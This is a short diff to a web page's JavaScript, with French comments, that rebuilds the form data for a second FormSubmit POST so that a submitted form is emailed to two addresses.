@@ -264,10 +264,15 @@ fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
     body: formData
 });
 
+// On recrée un FormData propre pour le deuxième envoi
+const formData2 = new FormData(event.target);
+formData2.append("_captcha", "false");
+formData2.append("_template", "table");
+
 // Deuxième envoi
 fetch("https://formsubmit.co/deuxiemeemail@example.com", {
     method: "POST",
-    body: formData
+    body: formData2
 });
 
     });
@@ -276,6 +281,7 @@ fetch("https://formsubmit.co/deuxiemeemail@example.com", {
 
 </body>
 </html>
+
 
 
 
